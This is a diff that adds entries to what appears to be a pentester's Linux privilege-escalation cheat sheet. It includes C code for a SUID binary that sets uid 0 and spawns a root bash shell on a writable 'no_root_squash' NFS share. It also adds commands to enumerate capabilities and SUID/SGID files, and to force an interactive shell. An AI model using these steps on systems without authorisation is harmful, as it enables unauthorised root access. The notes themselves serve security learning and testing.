@@ -17,6 +17,23 @@
 * Linux Smart Enumeration: https://github.com/diego-treitos/* linux-smart-enumeration
 * Linux Priv Checker: https://github.com/linted/linuxprivchecker 
 
+## Mount
+If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+```
+# cat foo.c
+int main(){
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+  return 0; 
+}
+
+# gcc foo.c -o foo
+
+# chmod +x ./foo
+# chmod +s ./foo
+```
 
 
 ## Commands
@@ -46,6 +63,10 @@ ip route
 
 netstat -plunta
 
+getcap -r / 2>/dev/null
+
+
+bash -i  #force interactive shell
 
 ```
 
@@ -71,3 +92,4 @@ netstat -plunta
 * ``find / -name python*``
 * ``find / -name gcc*``
 * ``find / -perm -u=s -type f 2>/dev/null`` Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
+* ```find / -type f -perm -04000 -ls 2>/dev/null``` will list files that have SUID or SGID bits set.
